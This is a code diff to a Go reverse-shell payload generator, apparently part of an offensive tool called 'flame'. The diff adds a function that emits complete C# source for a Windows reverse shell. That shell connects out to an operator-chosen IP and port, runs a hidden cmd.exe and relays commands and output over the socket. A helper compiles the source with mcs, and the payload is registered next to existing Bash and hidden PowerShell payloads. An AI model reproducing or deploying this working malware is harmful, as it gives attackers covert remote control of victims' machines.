@@ -3,6 +3,9 @@ package internal
 import (
 	"encoding/base64"
 	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -52,6 +55,74 @@ func (r *ReverseShellGenerator) GeneratePowerShellDetached() string {
 	return fmt.Sprintf(`Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-EncodedCommand','%s') | Out-Null`, encoded)
 }
 
+// GenerateCSharpSource generates a C# reverse shell source file using cmd.exe with async stdout/stderr streaming.
+func (r *ReverseShellGenerator) GenerateCSharpSource() string {
+	return fmt.Sprintf(`using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Sockets;
+using System.Text;
+
+public class Program
+{
+    public static void Main()
+    {
+        using (var client = new TcpClient("%s", %d))
+        using (var stream = client.GetStream())
+        using (var reader = new StreamReader(stream, Encoding.ASCII))
+        using (var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true })
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                RedirectStandardInput = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (var proc = new Process { StartInfo = psi })
+            {
+                proc.OutputDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
+                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
+                proc.Start();
+                proc.BeginOutputReadLine();
+                proc.BeginErrorReadLine();
+                writer.Write("flame> ");
+
+                string line;
+                while ((line = reader.ReadLine()) != null)
+                {
+                    proc.StandardInput.WriteLine(line);
+                    proc.StandardInput.Flush();
+                }
+            }
+        }
+    }
+}
+`, r.IP, r.Port)
+}
+
+func compileCSharpSource(source, outputPath string) error {
+	tmpDir, err := os.MkdirTemp("", "flame-csharp-")
+	if err != nil {
+		return err
+	}
+	defer os.RemoveAll(tmpDir)
+
+	srcPath := filepath.Join(tmpDir, "payload.cs")
+	if err := os.WriteFile(srcPath, []byte(source), 0644); err != nil {
+		return err
+	}
+	cmd := exec.Command("mcs", "-out:"+outputPath, srcPath)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("mcs failed: %v: %s", err, strings.TrimSpace(string(output)))
+	}
+	return nil
+}
+
 // encodeUTF16LE encodes a string to UTF-16 Little Endian
 func encodeUTF16LE(s string) []byte {
 	runes := []rune(s)
@@ -69,6 +140,7 @@ func (r *ReverseShellGenerator) GenerateAll() []string {
 		r.GenerateBash(),
 		r.GenerateBashBase64(),
 		r.GeneratePowerShell(),
+		r.GenerateCSharpSource(),
 	}
 }
 
@@ -78,6 +150,7 @@ func (r *ReverseShellGenerator) GetPayloadNames() []string {
 		"Bash",
 		"Bash (Base64)",
 		"PowerShell",
+		"CSharp",
 	}
 }
 
